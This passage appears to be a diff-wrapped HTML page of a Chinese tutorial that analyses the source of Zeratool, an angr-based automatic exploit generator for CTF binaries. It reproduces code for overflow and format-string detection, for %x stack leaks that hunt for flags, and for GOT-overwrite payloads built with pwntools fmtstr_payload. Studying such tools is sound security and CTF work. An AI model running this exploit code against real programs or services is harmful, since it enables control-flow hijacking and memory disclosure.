+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">for</span> path <span style="color:#f92672">in</span> simgr<span style="color:#f92672">.</span>unconstrained:  <span style="color:#75715e"># 检查 unconstrained 状态是否满足约束</span>
+            state <span style="color:#f92672">=</span> path<span style="color:#f92672">.</span>state 
+            eip <span style="color:#f92672">=</span> state<span style="color:#f92672">.</span>regs<span style="color:#f92672">.</span>pc   <span style="color:#75715e"># 获取 eip 的访问</span>
+            bits <span style="color:#f92672">=</span> state<span style="color:#f92672">.</span>arch<span style="color:#f92672">.</span>bits  <span style="color:#75715e"># 架构的位数，通常 32/64</span>
+            state_copy <span style="color:#f92672">=</span> state<span style="color:#f92672">.</span>copy()
+            <span style="color:#75715e">#Constrain pc to 0x41414141 or 0x41414141414141 </span>
+            constraints <span style="color:#f92672">=</span> []
+            <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(bits <span style="color:#f92672">/</span> <span style="color:#ae81ff">8</span>):     <span style="color:#75715e"># 逐次对 eip 的字节添加约束</span>
+                curr_byte <span style="color:#f92672">=</span> eip<span style="color:#f92672">.</span>get_byte(i)
+                constraint <span style="color:#f92672">=</span> claripy<span style="color:#f92672">.</span>And(curr_byte <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x41</span>)
+                constraints<span style="color:#f92672">.</span>append(constraint)
+            <span style="color:#75715e">#检查可满足性</span>
+            <span style="color:#66d9ef">if</span> state_copy<span style="color:#f92672">.</span>se<span style="color:#f92672">.</span>satisfiable(extra_constraints<span style="color:#f92672">=</span>constraints):
+                <span style="color:#66d9ef">for</span> constraint <span style="color:#f92672">in</span> constraints:
+                    state_copy<span style="color:#f92672">.</span>add_constraints(constraint)
+</code></pre></div><p><code>overflow_filter</code> 对SM中 <code>unconstrained</code> 状态进行分析，检查寄存器 pc 的值是否可控。设定输入约束，设置 pc 为指定值（这代表我们可以劫持控制流），接下来限定 stdin 输入为可打印字符。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"> <span style="color:#75715e">#约束输入值为可打印字符</span>
+ stdin <span style="color:#f92672">=</span> state<span style="color:#f92672">.</span>posix<span style="color:#f92672">.</span>files[<span style="color:#ae81ff">0</span>]
+ constraints <span style="color:#f92672">=</span> []
+ stdin_size <span style="color:#f92672">=</span> <span style="color:#ae81ff">300</span>
+ stdin<span style="color:#f92672">.</span>length <span style="color:#f92672">=</span> stdin_size
+ stdin<span style="color:#f92672">.</span>seek(<span style="color:#ae81ff">0</span>)
+ stdin_bytes <span style="color:#f92672">=</span> stdin<span style="color:#f92672">.</span>all_bytes()
+ <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(stdin_size):
+     curr_byte <span style="color:#f92672">=</span> stdin<span style="color:#f92672">.</span>read_from(<span style="color:#ae81ff">1</span>)
+     constraint <span style="color:#f92672">=</span> claripy<span style="color:#f92672">.</span>And(curr_byte <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0x2F</span>, curr_byte <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0x7F</span>) <span style="color:#75715e"># 添加约束</span>
+     <span style="color:#66d9ef">if</span> state<span style="color:#f92672">.</span>se<span style="color:#f92672">.</span>satisfiable(extra_constraints<span style="color:#f92672">=</span>[constraint]):   <span style="color:#75715e"># 判断是否满足</span>
+         constraints<span style="color:#f92672">.</span>append(constraint)
+</code></pre></div><p>通过以上步骤，我们主要添加了两大约束：1. 限定寄存器 pc 的值 2. 限定 stdin 为可打印字符。</p>
+<p>添加约束后，使用求解器对输入字符串进行约束求解，可以求解说明找到可利用状态。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"> <span style="color:#75715e">#对 stdin 输入字符串进行约束求解</span>
+stdin_str <span style="color:#f92672">=</span> repr(str(state<span style="color:#f92672">.</span>posix<span style="color:#f92672">.</span>dumps(<span style="color:#ae81ff">0</span>)<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>,<span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x01</span><span style="color:#e6db74">&#39;</span>,<span style="color:#e6db74">&#39;&#39;</span>)))
+<span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;[+] Vulnerable path found {}&#34;</span><span style="color:#f92672">.</span>format(stdin_str))
+state<span style="color:#f92672">.</span>globals[<span style="color:#e6db74">&#39;type&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Overflow&#34;</span>  <span style="color:#75715e"># 设置漏洞类型</span>
+simgr<span style="color:#f92672">.</span>stashes[<span style="color:#e6db74">&#39;found&#39;</span>]<span style="color:#f92672">.</span>append(path) <span style="color:#75715e"># 添加找到的路径/状态</span>
+simgr<span style="color:#f92672">.</span>stashes[<span style="color:#e6db74">&#39;unconstrained&#39;</span>]<span style="color:#f92672">.</span>remove(path)
+</code></pre></div><p>通过 <code>overflow_filter</code>  ，我们可以确定状态的漏洞类型及可利用状态。</p>
+<p>在进行程序状态探索时，如果找到确定了漏洞类型即停止探索，将相关信息存储在 <code>run_environ</code> 变量中并返回。</p>
+<h4 id="检查格式化字符串漏洞">检查格式化字符串漏洞</h4>
+<p><a href="https://github.com/ChrisTheCoolHut/Zeratool/blob/master/lib/formatDetector.py">formatDetector.py</a>   检查是否有格式化字符串漏洞。</p>
+<p>zeratool 会使用 <code>printFormat</code> 函数 hook printf 函数。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">  p<span style="color:#f92672">.</span>hook_symbol(<span style="color:#e6db74">&#39;printf&#39;</span>,printFormat)
+</code></pre></div><p>然后与缓冲区溢出检查类似，探索程序状态，当有 <code>state</code> 满足 find 条件时，状态会保存在 <code>found</code> stash 中，并将漏洞相关信息保存在<code>run_environ</code>对象返回。不同的是，主要分析逻辑在 <code>printFormat</code> 中。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"> <span style="color:#66d9ef">try</span>:
+        <span style="color:#a6e22e">@timeout_decorator.timeout</span>(<span style="color:#ae81ff">120</span>)
+        <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">exploreBinary</span>(simgr):
+            simgr<span style="color:#f92672">.</span>explore(find<span style="color:#f92672">=</span><span style="color:#66d9ef">lambda</span> s: <span style="color:#e6db74">&#39;type&#39;</span> <span style="color:#f92672">in</span> s<span style="color:#f92672">.</span>globals)
+        exploreBinary(simgr)
+        <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#39;found&#39;</span> <span style="color:#f92672">in</span> simgr<span style="color:#f92672">.</span>stashes <span style="color:#f92672">and</span> len(simgr<span style="color:#f92672">.</span>found):
+            end_state <span style="color:#f92672">=</span> simgr<span style="color:#f92672">.</span>found[<span style="color:#ae81ff">0</span>]
+            run_environ[<span style="color:#e6db74">&#39;type&#39;</span>] <span style="color:#f92672">=</span> end_state<span style="color:#f92672">.</span>globals[<span style="color:#e6db74">&#39;type&#39;</span>]
+            run_environ[<span style="color:#e6db74">&#39;position&#39;</span>] <span style="color:#f92672">=</span> end_state<span style="color:#f92672">.</span>globals[<span style="color:#e6db74">&#39;position&#39;</span>]
+            run_environ[<span style="color:#e6db74">&#39;length&#39;</span>] <span style="color:#f92672">=</span> end_state<span style="color:#f92672">.</span>globals[<span style="color:#e6db74">&#39;length&#39;</span>]
+ <span style="color:#66d9ef">if</span> (inputType <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;STDIN&#34;</span> <span style="color:#f92672">or</span> inputType <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;LIBPWNABLE&#34;</span>)<span style="color:#f92672">and</span> end_state <span style="color:#f92672">is</span> <span style="color:#f92672">not</span> None:
+        stdin_str <span style="color:#f92672">=</span> str(end_state<span style="color:#f92672">.</span>posix<span style="color:#f92672">.</span>dumps(<span style="color:#ae81ff">0</span>))
+        <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;[+] Triggerable with STDIN : {}&#34;</span><span style="color:#f92672">.</span>format(stdin_str))
+        run_environ[<span style="color:#e6db74">&#39;input&#39;</span>] <span style="color:#f92672">=</span> stdin_str <span style="color:#75715e"># 记录触发漏洞的输入字符串</span>
+</code></pre></div><p>接下来，我们来看一下 <code>printFormat</code>  的逻辑，因为是 hook <code>printf</code> 函数，<code>printFormat</code> 相当于一个 <code>SimProcedure</code>  对象。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">printFormat</span>(angr<span style="color:#f92672">.</span>procedures<span style="color:#f92672">.</span>libc<span style="color:#f92672">.</span>printf<span style="color:#f92672">.</span>printf):
+</code></pre></div><p><code>printFormat</code> 首先检查传递给 <code>printf</code> 的变量的内存中是否有可控字节：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> xrange(<span style="color:#ae81ff">5</span>):
+     state_copy <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>state<span style="color:#f92672">.</span>copy() <span style="color:#75715e"># 获得当前 State 的拷贝</span>
+     solv <span style="color:#f92672">=</span> state_copy<span style="color:#f92672">.</span>solver<span style="color:#f92672">.</span>eval 
+     printf_arg <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>arg(i)     <span style="color:#75715e"># 获得 printf 的参数</span>
+     var_loc <span style="color:#f92672">=</span> solv(printf_arg)
+     var_value <span style="color:#f92672">=</span> state_copy<span style="color:#f92672">.</span>memory<span style="color:#f92672">.</span>load(var_loc) <span style="color:#75715e"># 加载参数变量</span>
+     var_value_length <span style="color:#f92672">=</span> int(<span style="color:#e6db74">&#34;0x&#34;</span><span style="color:#f92672">+</span>str(var_value<span style="color:#f92672">.</span>length),<span style="color:#ae81ff">16</span>) <span style="color:#75715e"># 变量长度</span>
+     symbolic_list <span style="color:#f92672">=</span> [state_copy<span style="color:#f92672">.</span>memory<span style="color:#f92672">.</span>load(var_loc <span style="color:#f92672">+</span> x)<span style="color:#f92672">.</span>get_byte(<span style="color:#ae81ff">0</span>)<span style="color:#f92672">.</span>symbolic <span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> xrange(var_value_length)] <span style="color:#75715e"># 获取变量中的可控字节（符号化）</span>
+</code></pre></div><p>接下来借用 <code>symbolic_list</code> 寻找最大的可缓冲区</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"> position <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>  <span style="color:#75715e">#记录缓冲区起始位置</span>
+ count <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+ greatest_count <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span> <span style="color:#75715e"># 可控区域的最大长度</span>
+ prev_item <span style="color:#f92672">=</span> symbolic_list[<span style="color:#ae81ff">0</span>]
+ <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">1</span>,len(symbolic_list)):
+         <span style="color:#66d9ef">if</span> symbolic_list[i] <span style="color:#f92672">and</span> symbolic_list[i] <span style="color:#f92672">==</span> symbolic_list[i<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]:
+             count <span style="color:#f92672">=</span> count <span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>
+             <span style="color:#66d9ef">if</span> (count <span style="color:#f92672">&gt;</span> greatest_count):
+                 greatest_count <span style="color:#f92672">=</span> count <span style="color:#75715e"># 更新最大长度</span>
+                 position <span style="color:#f92672">=</span> i <span style="color:#f92672">-</span> count   <span style="color:#75715e"># 更新起始位置</span>
+         <span style="color:#66d9ef">else</span>:
+             <span style="color:#66d9ef">if</span> (count <span style="color:#f92672">&gt;</span> greatest_count):
+                 greatest_count <span style="color:#f92672">=</span> count  <span style="color:#75715e"># 更新最大长度</span>
+                 position <span style="color:#f92672">=</span> i <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">-</span> count <span style="color:#75715e"># 更新起始位置</span>
+             count <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>  <span style="color:#75715e"># 置零，重新开始统计</span>
+ <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;[+] Found symbolic buffer at position {} of length {}&#34;</span><span style="color:#f92672">.</span>format(position,greatest_count))  
+</code></pre></div><p>最后找到以 <code>position</code> 为起始位置，长度为 <code>greatest_count</code> 的一片可控缓冲区。</p>
+<p>接下来，对缓冲区内容添加约束并求解 stdin 的输入，如果可以求解，<code>stdin_str</code> 中包含 &ldquo;%x_&rdquo; ，则说明存在格式化字符串漏洞。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">if</span> greatest_count <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>:
+    str_val <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">%x</span><span style="color:#e6db74">_&#34;</span>
+ self<span style="color:#f92672">.</span>constrainBytes(state_copy,var_value,var_loc,position,var_value_length,strVal<span style="color:#f92672">=</span>str_val) <span style="color:#75715e"># 对缓冲区内容添加约束</span>
+    vuln_string <span style="color:#f92672">=</span> solv(var_value, cast_to<span style="color:#f92672">=</span>str) <span style="color:#75715e"># 获得变量 string 形式的字符串</span>
+     <span style="color:#75715e">#Verify solution</span>
+    <span style="color:#66d9ef">if</span> state_copy<span style="color:#f92672">.</span>globals[<span style="color:#e6db74">&#39;inputType&#39;</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;STDIN&#34;</span> <span style="color:#f92672">or</span> state_copy<span style="color:#f92672">.</span>globals[<span style="color:#e6db74">&#39;inputType&#39;</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;LIBPWNABLE&#34;</span>:
+        stdin_str <span style="color:#f92672">=</span> str(state_copy<span style="color:#f92672">.</span>posix<span style="color:#f92672">.</span>dumps(<span style="color:#ae81ff">0</span>)) <span style="color:#75715e"># 约束求解，获得输入字符串</span>
+        <span style="color:#66d9ef">if</span> str_val <span style="color:#f92672">in</span> stdin_str:  <span style="color:#75715e"># 说明存在格式化字符串漏洞</span>
+            var_value <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>state<span style="color:#f92672">.</span>memory<span style="color:#f92672">.</span>load(var_loc)
+            self<span style="color:#f92672">.</span>constrainBytes(self<span style="color:#f92672">.</span>state,var_value,var_loc,position,var_value_length)
+            <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;[+] Vulnerable path found {}&#34;</span><span style="color:#f92672">.</span>format(vuln_string)) <span style="color:#75715e"># 输出漏洞字符串</span>
+            self<span style="color:#f92672">.</span>state<span style="color:#f92672">.</span>globals[<span style="color:#e6db74">&#39;type&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Format&#34;</span>
+            self<span style="color:#f92672">.</span>state<span style="color:#f92672">.</span>globals[<span style="color:#e6db74">&#39;position&#39;</span>] <span style="color:#f92672">=</span> position
+            self<span style="color:#f92672">.</span>state<span style="color:#f92672">.</span>globals[<span style="color:#e6db74">&#39;length&#39;</span>] <span style="color:#f92672">=</span> greatest_count
+            <span style="color:#66d9ef">return</span> True
+</code></pre></div><p>调用 <code>constrainBytes</code> 函数用于对缓冲区添加约束，设置其内容为指定字符串。默认字符串 pattern 为  <code>%x_</code> ，实现如下：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e"># length 为缓冲区长度，loc 缓冲区位置。（实际并没有用到 symVar 和 position）</span>
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">constrainBytes</span>(self, state, symVar, loc,position, length, strVal<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">%x</span><span style="color:#e6db74">_&#34;</span>):
+   <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(length):
+            strValIndex <span style="color:#f92672">=</span> i <span style="color:#f92672">%</span> len(strVal) <span style="color:#75715e"># 获得对应的字符</span>
+            curr_byte <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>state<span style="color:#f92672">.</span>memory<span style="color:#f92672">.</span>load(loc <span style="color:#f92672">+</span> i)<span style="color:#f92672">.</span>get_byte(<span style="color:#ae81ff">0</span>)  <span style="color:#75715e">#获得对应字节</span>
+            constraint <span style="color:#f92672">=</span> state<span style="color:#f92672">.</span>se<span style="color:#f92672">.</span>And(strVal[strValIndex] <span style="color:#f92672">==</span> curr_byte)  <span style="color:#75715e"># 添加约束</span>
+            <span style="color:#66d9ef">if</span> (state<span style="color:#f92672">.</span>se<span style="color:#f92672">.</span>satisfiable(extra_constraints<span style="color:#f92672">=</span>[constraint])): <span style="color:#75715e"># 判断是否可以满足约束</span>
+                state<span style="color:#f92672">.</span>add_constraints(constraint)
+            <span style="color:#66d9ef">else</span>:
+                <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;[~] Byte {} not constrained to {}&#34;</span><span style="color:#f92672">.</span>format(i,strVal[strValIndex]))
+</code></pre></div><h4 id="检查信息泄露">检查信息泄露</h4>
+<p><code>formatLeak.checkLeak()</code> 检查是否可以直接通过信息泄露获得 flag。</p>
+<p>在检查格式化字符串漏洞模块，我们会记录触发漏洞的输入字符串（stdin_str)  通过访问 <code>properties['pwn_type']['input']</code> 可以得到。</p>
+<p>%x 用于以十六进制的形式输出变量信息，通过构造多个 %x，我们可以越界输出栈上的内容。%x 用于泄露内存中的数据。</p>
+<p>设置格式化字符串，依次泄露字符串后的地址，以 8 位十六进制数显示，每一轮发送一次字符串。<code>format_count</code> 代表格式化字符串中 %x 的数目。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">format_count <span style="color:#f92672">=</span> base_input_string<span style="color:#f92672">.</span>count(<span style="color:#e6db74">&#39;_</span><span style="color:#e6db74">%x</span><span style="color:#e6db74">&#39;</span>)
+    <span style="color:#66d9ef">if</span> properties[<span style="color:#e6db74">&#39;input_type&#39;</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;STDIN&#34;</span> <span style="color:#f92672">or</span> properties[<span style="color:#e6db74">&#39;input_type&#39;</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;LIBPWNABLE&#34;</span>:
+        <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> xrange((run_count <span style="color:#f92672">/</span> format_count) <span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>):
+            <span style="color:#75715e">#Create local or remote process</span>
+            <span style="color:#66d9ef">if</span> remote_server:
+                proc <span style="color:#f92672">=</span> remote(remote_url,port_num)
+            <span style="color:#66d9ef">else</span>:
+                proc <span style="color:#f92672">=</span> process(binary_name)
+            input_string <span style="color:#f92672">=</span> base_input_string  <span style="color:#75715e"># 输入个格式化字符串</span>
+            <span style="color:#75715e">#Swap in values for every _%x</span>
+            <span style="color:#66d9ef">for</span> j <span style="color:#f92672">in</span> range(format_count):
+                iter_num <span style="color:#f92672">=</span> (i <span style="color:#f92672">*</span> format_count) <span style="color:#f92672">+</span> j <span style="color:#75715e"># 计算是第几个 %x </span>
+                <span style="color:#75715e">#设置格式化字符串的值，第 iter_num个值以8位十六进制数显示</span>
+                input_string <span style="color:#f92672">=</span> input_string<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#39;_</span><span style="color:#e6db74">%x</span><span style="color:#e6db74">&#39;</span>,<span style="color:#e6db74">&#39;_%{}$08x&#39;</span><span style="color:#f92672">.</span>format(iter_num),<span style="color:#ae81ff">1</span>)
+            proc<span style="color:#f92672">.</span>sendline(input_string)       <span style="color:#75715e"># 发送字符串 </span>
+            results <span style="color:#f92672">=</span> proc<span style="color:#f92672">.</span>recvall(timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">5</span>)  <span style="color:#75715e"># 返回信息</span>
+</code></pre></div><p>发送格式化字符串后，通过 <code>printf</code> 函数，我们获得输出信息，下一步进行解析，使用 ”_&quot; 作为分割</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">data_leaks <span style="color:#f92672">=</span> results<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;_&#39;</span>)
+data_leaks <span style="color:#f92672">=</span> [x[<span style="color:#ae81ff">0</span>:<span style="color:#ae81ff">8</span>] <span style="color:#66d9ef">if</span> all([y <span style="color:#f92672">in</span> string<span style="color:#f92672">.</span>hexdigits <span style="color:#66d9ef">for</span> y <span style="color:#f92672">in</span> x]) <span style="color:#66d9ef">else</span> <span style="color:#e6db74">&#34;&#34;</span> <span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> data_leaks]
+data_leaks <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>join([y[x:x<span style="color:#f92672">+</span><span style="color:#ae81ff">2</span>] <span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>, len(y), <span style="color:#ae81ff">2</span>)][::<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]) <span style="color:#66d9ef">for</span> y <span style="color:#f92672">in</span> data_leaks]
+<span style="color:#66d9ef">try</span>:
+    data_copy <span style="color:#f92672">=</span> data_leaks
+    data_leaks <span style="color:#f92672">=</span> [binascii<span style="color:#f92672">.</span>unhexlify(x) <span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> data_leaks]
+</code></pre></div><p>最后获得完整的输出信息(<code>full_string</code>), 如果该字符串中存在 “{” 和 “}” 则说明获得了 flag, 将泄露信息返回</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#39;{&#39;</span> <span style="color:#f92672">in</span> full_string <span style="color:#f92672">and</span> <span style="color:#e6db74">&#39;}&#39;</span> <span style="color:#f92672">in</span> full_string:  <span style="color:#75715e"># 判断是否存在 flag</span>
+    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;[+] Flag found:&#34;</span>)
+    leakProperties[<span style="color:#e6db74">&#39;flag_found&#39;</span>] <span style="color:#f92672">=</span> True        <span style="color:#75715e"># 标志 flag found</span>
+leakProperties[<span style="color:#e6db74">&#39;leak_string&#39;</span>] <span style="color:#f92672">=</span> full_string    <span style="color:#75715e"># 泄露的信息</span>
+<span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;[+] Returned {}&#34;</span><span style="color:#f92672">.</span>format(full_string))
+    <span style="color:#66d9ef">return</span> leakProperties
+</code></pre></div><p>以上就是漏洞检测相关内容，接下来我们查看漏洞利用部分。</p>
+<h3 id="漏洞利用">漏洞利用</h3>
+<h4 id="格式化字符串漏洞">格式化字符串漏洞</h4>
+<p>基本利用技巧为修改 got 表项为 shellcode 地址或目标函数。</p>
+<p><a href="https://github.com/ChrisTheCoolHut/Zeratool/blob/d4dda1a017/lib/formatExploiter.py">formatExploiter.py</a></p>
+<p>利用思路：</p>
+<ol>
+<li>计算格式化字符串的偏移量</li>
+<li>通过构造 payload 修改 got 表项目标函数或 shellcode 地址（不考虑 NX 包含）</li>
+</ol>
+<p>首先获得格式化字符串缓冲区在栈上偏移，记为 <code>stack_position</code>：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"> <span style="color:#75715e">#Determine stack location</span>
+<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">50</span>):
+    iter_string <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;aaaa_%{}$08x_&#34;</span><span style="color:#f92672">.</span>format(i) <span style="color:#75715e"># 关键 payload,用于探测 buffer的偏移</span>
+    iter_string <span style="color:#f92672">=</span> assembleInput(iter_string,start_slice,end_slice,input_len)
+    results <span style="color:#f92672">=</span> runIteration(binary_name,iter_string,input_type<span style="color:#f92672">=</span>properties[<span style="color:#e6db74">&#39;input_type&#39;</span>])
+    <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#34;61616161&#34;</span> <span style="color:#f92672">in</span> results: <span style="color:#75715e"># 0x41414141 == &#34;AAAA&#34;</span>
+        stack_position <span style="color:#f92672">=</span> i  <span style="color:#75715e"># 确定 buffer 的偏移为 i </span>
+        <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;[+] Found stack location at {}&#34;</span><span style="color:#f92672">.</span>format(stack_position))
+        <span style="color:#66d9ef">break</span>
+</code></pre></div><p>其中使用 <code>assembleInput</code> 函数计算得到输入的字符串。<code>runIteration</code> 函数用于发送 payload 并处理得到的字符串。</p>
+<p>如果存在目标函数，则覆盖某一 got 表项为目标函数的地址：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">	<span style="color:#75715e"># 对于存在目标函数的情况</span>
+    <span style="color:#66d9ef">if</span> len(properties[<span style="color:#e6db74">&#39;win_functions&#39;</span>]) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>:
+        <span style="color:#66d9ef">for</span> func <span style="color:#f92672">in</span> properties[<span style="color:#e6db74">&#39;win_functions&#39;</span>]:
+            address <span style="color:#f92672">=</span> properties[<span style="color:#e6db74">&#39;win_functions&#39;</span>][func][<span style="color:#e6db74">&#39;fcn_addr&#39;</span>] <span style="color:#75715e">#获取目标函数</span>
+            <span style="color:#66d9ef">for</span> got_name,got_addr <span style="color:#f92672">in</span> properties[<span style="color:#e6db74">&#39;protections&#39;</span>][<span style="color:#e6db74">&#39;got&#39;</span>]<span style="color:#f92672">.</span>items(): <span style="color:#75715e"># 遍历 got 表项</span>
+                <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;[~] Overwritting {}&#34;</span><span style="color:#f92672">.</span>format(got_name))
+                writes <span style="color:#f92672">=</span> {got_addr:address}
+                format_payload <span style="color:#f92672">=</span> fmtstr_payload(stack_position, writes, numbwritten<span style="color:#f92672">=</span>input_pos) <span style="color:#75715e"># 构造 payload,将 got 地址改为目标函数地址</span>
+                <span style="color:#66d9ef">if</span> len(format_payload) <span style="color:#f92672">&gt;</span> input_len:
+                    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;[~] Format input to large, shrinking&#34;</span>)
+                    format_payload <span style="color:#f92672">=</span> fmtstr_payload(stack_position, writes, numbwritten<span style="color:#f92672">=</span>input_pos, write_size<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;short&#39;</span>)
+
+                format_input <span style="color:#f92672">=</span> assembleInput(format_payload,start_slice,end_slice,input_len) <span style="color:#75715e"># 获取输入字符串</span>
+				<span style="color:#75715e"># 发送payload 并处理返回结果</span>
+                results <span style="color:#f92672">=</span> sendExploit(binary_name,properties,format_input) 
+                <span style="color:#66d9ef">if</span> results[<span style="color:#e6db74">&#39;flag_found&#39;</span>]:
+                    exploit_results[<span style="color:#e6db74">&#39;flag_found&#39;</span>] <span style="color:#f92672">=</span> results[<span style="color:#e6db74">&#39;flag_found&#39;</span>]
+                    exploit_results[<span style="color:#e6db74">&#39;input&#39;</span>] <span style="color:#f92672">=</span> format_input
+                    <span style="color:#66d9ef">return</span> exploit_results
+        <span style="color:#66d9ef">return</span> exploit_results
+</code></pre></div><p>构造 <code>payload</code> 时利用了 <code>pwntools</code> 的 <code>fmtstr_payload</code> 工具（ <code>format_payload</code> 详细 <a href="https://docs.pwntools.com/en/stable/fmtstr.html#pwnlib.fmtstr.fmtstr_payload">API信息</a> )</p>
+<p><code>fmtstr_payload</code> 用于自动生成格式化字符串 <code>payload</code>：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">pwnlib<span style="color:#f92672">.</span>fmtstr<span style="color:#f92672">.</span>fmtstr_payload(offset, writes, numbwritten<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>, write_size<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;byte&#39;</span>)
+
+<span style="color:#f92672">-</span> offset (int)<span style="color:#960050;background-color:#1e0010">：控制的第一个格式化变量的偏移量</span>
